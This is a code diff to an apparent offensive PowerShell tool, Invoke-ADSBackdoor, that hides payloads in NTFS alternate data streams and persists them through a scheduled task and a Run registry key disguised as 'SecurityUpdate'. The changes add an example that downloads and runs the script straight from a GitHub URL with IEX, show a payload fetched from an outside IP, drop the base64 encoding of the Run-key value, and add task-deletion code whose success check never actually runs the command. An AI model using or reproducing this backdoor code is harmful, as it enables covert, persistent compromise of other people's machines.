@@ -11,6 +11,9 @@ stores some VBScript that acts as a wrapper in order to hide the DOS prompt when
 payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
 The arguments must also be in quotation marks.
 
+.EXAMPLE
+TO Remove ADSbackdoor:
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/simonpunk/simon/master/Invoke-ADSBackdoor.ps1'); Remove-ADSBackdoor
 
 .EXAMPLE
 PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"
@@ -83,11 +86,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     Invoke-Command -ScriptBlock $CreateScheduleADS
     "Schedule payload is triggered on every 30 minutes"
     
-    #Encode Reg path
-    $Regeditpayload = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
-    $encodedRegeditPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Regeditpayload))
     #Persist in Registry
-    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SecurityUpdate -PropertyType String -Value $encodedRegeditPayload -Force
+    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SecurityUpdate -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
     "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate"
 }
 
@@ -165,7 +165,15 @@ removing the registry key.
     $vbsFile = $trigger.split(" ")[1]
     $getWrapperADS = {cmd /C "more <  $vbsFile"}
     $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
-
+    $Killschtasks = {cmd /C "schtasks /delete /tn SecurityUpdate /f"}
+    
+    if ($Killschtasks){
+        "Successfully kill schtasks"
+    }
+    else{
+        "[!] Error: Couldn't kill scheduled payload 'SecurityUpdate'."
+    }
+    
     if ($wrapper -match 'i in \((.+?)\)')
     {
         # extract out the payload .txt file location
